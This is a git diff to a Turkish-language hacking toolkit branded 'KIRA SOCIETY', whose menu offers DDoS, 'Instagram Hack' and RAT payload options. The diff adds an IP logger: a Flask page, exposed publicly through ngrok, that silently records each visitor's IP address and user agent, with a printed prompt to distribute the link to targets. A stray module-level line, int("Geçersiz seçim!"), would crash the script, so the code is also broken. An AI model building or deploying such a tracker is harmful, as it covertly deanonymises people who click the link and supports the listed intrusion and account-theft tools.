@@ -5,6 +5,8 @@ import os
 import sys
 import time
 from datetime import datetime
+from flask import Flask, request
+import pyngrok.ngrok as ngrok
 
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
@@ -25,7 +27,80 @@ def banner():
        ~KIRA SOCIETY~
     '''
     print("\033[1;35mInstagram: @0xkirasociety\033[0m") 
-    print("\033[91m" + ascii_art + "\033[0m") 
+    print("\033[91m" + ascii_art + "\033[0m")
+
+int("Geçersiz seçim!")
+
+def start_ip_logger():
+    banner()
+    print("\033[91mIP Logger Tool Hatalı Olabilir\033[0m")
+    
+    app = Flask(__name__)
+    LOG_FILE = "ip_log.txt"
+
+    @app.route('/')
+    def log_ip():
+        client_ip = request.remote_addr
+        user_agent = request.headers.get('User-Agent')
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        log_entry = f"[{current_time}] IP: {client_ip} | User-Agent: {user_agent}\n"
+        
+        with open(LOG_FILE, "a") as f:
+            f.write(log_entry)
+        
+        return '''
+        <html>
+        <head>
+            <title>KIRA SOCIETY</title>
+            <style>
+                @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
+                body {
+                    background-color: #121212;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    margin: 0;
+                    overflow: hidden;
+                }
+                .text {
+                    font-family: 'Pacifico', cursive;
+                    font-size: 3em;
+                    color: #ff00ff;
+                    text-shadow: 0 0 10px #00ffff;
+                    animation: swing 2s infinite alternate ease-in-out;
+                }
+                @keyframes swing {
+                    0% { transform: rotate(-5deg); }
+                    100% { transform: rotate(5deg); }
+                }
+            </style>
+        </head>
+        <body>
+            <div class="text">Naber Kanka 😎</div>
+        </body>
+        </html>
+        '''
+    
+    domain = input("Domain/URL girin (örn: kiralogger.com): ").strip()
+    if not domain:
+        domain = "127.0.0.1:5000"
+    
+    print("\n[1] Localhost (127.0.0.1:5000)")
+    print("[2] Ngrok (Public URL)")
+    choice = input("Seçim yapın (1/2): ").strip()
+    
+    if choice == "1":
+        print(f"\n[+] IP Logger başlatıldı: http://{domain}")
+        app.run(host='0.0.0.0', port=5000)
+    elif choice == "2":
+        public_url = ngrok.connect(5000, "http")
+        print(f"\n[+] IP Logger başlatıldı: {public_url}")
+        print(f"[!] Şu linki dağıt: {public_url}")
+        app.run(host='0.0.0.0', port=5000)
+    else:
+        print("Geçersiz seçim!")
 
 def ddos_attack():
     banner()
@@ -256,7 +331,8 @@ def main():
         print("  \033[1;33m║\033[0m \033[91m[2] Instagram Hack    \033[0m\033[1;33m║\033[0m")
         print("  \033[1;33m║\033[0m \033[91m[3] Port Scanner      \033[0m\033[1;33m║\033[0m")
         print("  \033[1;33m║\033[0m \033[91m[4] IP Lookup         \033[0m\033[1;33m║\033[0m")
-        print("  \033[1;33m║\033[0m \033[91m[5] RAT Payload Yapmak. \033[0m\033[1;33m║\033[0m")
+        print("  \033[1;33m║\033[0m \033[91m[5] RAT Payload Oluştur\033[0m\033[1;33m║\033[0m")
+        print("  \033[1;33m║\033[0m \033[91m[6] IP Logger         \033[0m\033[1;33m║\033[0m")
         print("  \033[1;33m║\033[0m \033[91m[0] Exit              \033[0m\033[1;33m║\033[0m")
         print("  \033[1;33m╚════════════════════════╝\033[0m")
         print("\033[0m")
@@ -271,6 +347,8 @@ def main():
             ip_lookup()
         elif choice == "5":
             rat_payload_creator()
+        elif choice == "6":
+            start_ip_logger()
         elif choice == "0":
             print("Çıkış Yapılıyor...")
             break
